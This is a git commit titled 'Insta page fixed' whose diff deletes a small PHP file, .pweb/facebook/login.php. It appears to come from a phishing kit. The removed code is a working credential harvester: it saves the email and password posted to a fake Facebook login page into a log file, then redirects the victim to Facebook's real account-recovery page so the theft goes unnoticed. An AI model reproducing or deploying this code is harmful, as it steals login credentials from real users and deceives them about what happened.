74599820628eeef0fd000a5c688306aa60d42b89
prince <prince@localhost.localdomain>
2023-10-23 20:51:03 +0530

    Insta page fixed

--- .pweb/facebook/login.php
+++
@@ -1,5 +0,0 @@
-<?php 
-file_put_contents("userlog.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
-exit();
-?>
